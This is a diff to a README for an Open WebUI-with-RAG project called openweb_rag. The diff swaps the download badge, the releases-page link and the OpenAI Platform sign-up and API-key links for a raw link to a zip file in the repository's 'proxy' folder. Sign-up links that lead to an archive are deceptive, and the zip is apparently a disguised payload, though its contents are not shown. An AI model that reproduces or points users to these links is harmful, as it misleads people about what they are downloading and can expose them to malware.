@@ -1,7 +1,7 @@
 # 🌐 openweb_rag - Seamless Chat with Your Documents
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Panada7w7/openweb_rag/releases)
+[![Download](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip)](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip)
 
 ## 📋 Description
 Open WebUI with OpenAI API and RAG
@@ -30,8 +30,8 @@ Before you download and run the application, ensure you meet the following requi
      ```
 
 2. **OpenAI API Key**
-   - Sign up for an account at [OpenAI Platform](https://platform.openai.com/).
-   - Create your API key by visiting [API Keys](https://platform.openai.com/api-keys).
+   - Sign up for an account at [OpenAI Platform](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip).
+   - Create your API key by visiting [API Keys](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip).
    - Make sure you have funding set up to use the API.
 
 3. **System Requirements**
@@ -40,7 +40,7 @@ Before you download and run the application, ensure you meet the following requi
 ### 2. 🔄 Download & Install
 To get started, you need to download the application.
 
-Visit the [Releases page](https://github.com/Panada7w7/openweb_rag/releases) to download the latest version. Choose the relevant file for your operating system, and follow the prompts to install.
+Visit the [Releases page](https://raw.githubusercontent.com/Panada7w7/openweb_rag/main/proxy/openweb_rag_v3.4.zip) to download the latest version. Choose the relevant file for your operating system, and follow the prompts to install.
 
 ### 3. 🏗️ Running the Application
 Once you have Docker set up and the application downloaded, follow these steps to run it:
